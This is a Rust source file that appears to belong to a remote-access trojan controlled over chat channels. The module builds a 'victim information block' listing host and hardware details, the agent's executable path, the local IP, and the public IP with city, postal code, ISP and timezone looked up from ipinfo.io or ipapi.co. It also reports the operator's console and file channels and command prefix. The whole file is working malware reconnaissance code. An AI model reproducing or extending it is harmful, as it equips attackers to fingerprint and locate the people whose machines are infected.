// language: Rust, file: src/info.rs
// Victim information block: host/os/cpu/mem (host.rs), local IP, public IP + geolocation.
#![allow(dead_code)]
use crate::config::Config;
use crate::host;
use crate::workspace::Workspace;

pub async fn dump(cfg: &Config, ws: &Workspace) -> String {
    let mut out = host::sysinfo_text();
    out.push_str(&format!("\nvictim id: {}", ws.victim_id));
    out.push_str(&format!("\nagent exe: {}", exe_path()));
    if let Some(ip) = local_ip() {
        out.push_str(&format!("\nlocal ip: {ip}"));
    }
    match geo().await {
        Some(g) => out.push_str(&format!("\n{g}")),
        None => out.push_str("\npublic ip / geo: unavailable"),
    }
    out.push_str(&format!("\ncategory: {}", ws.category_id));
    out.push_str(&format!("\nconsole channel: {}", ws.channels.console));
    out.push_str(&format!("\nfiles channel: {}", ws.channels.files));
    out.push_str(&format!("\ncommand prefix: {}", cfg.prefix));
    out
}

fn exe_path() -> String {
    std::env::current_exe()
        .map(|p| p.display().to_string())
        .unwrap_or_default()
}

/// Primary local address, resolved without sending a packet.
fn local_ip() -> Option<String> {
    let s = std::net::UdpSocket::bind("0.0.0.0:0").ok()?;
    s.connect("8.8.8.8:80").ok()?;
    Some(s.local_addr().ok()?.ip().to_string())
}

/// Public IP + coarse geolocation. Tries ipinfo.io, falls back to ipapi.co.
async fn geo() -> Option<String> {
    let c = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(8))
        .build()
        .ok()?;

    if let Ok(r) = c.get("https://ipinfo.io/json").send().await {
        if let Ok(v) = r.json::<serde_json::Value>().await {
            if v["ip"].as_str().is_some() {
                let g = |k: &str| v[k].as_str().unwrap_or("?");
                return Some(format!(
                    "public ip: {}\nlocation: {}, {} ({}) {}\nisp: {}\ntimezone: {}",
                    g("ip"), g("city"), g("region"), g("country"), g("postal"), g("org"), g("timezone")
                ));
            }
        }
    }
    if let Ok(r) = c.get("https://ipapi.co/json/").send().await {
        if let Ok(v) = r.json::<serde_json::Value>().await {
            if v["ip"].as_str().is_some() {
                let g = |k: &str| v[k].as_str().unwrap_or("?");
                return Some(format!(
                    "public ip: {}\nlocation: {}, {} ({})\nisp: {}\ntimezone: {}",
                    g("ip"), g("city"), g("region"), g("country_name"), g("org"), g("timezone")
                ));
            }
        }
    }
    None
}
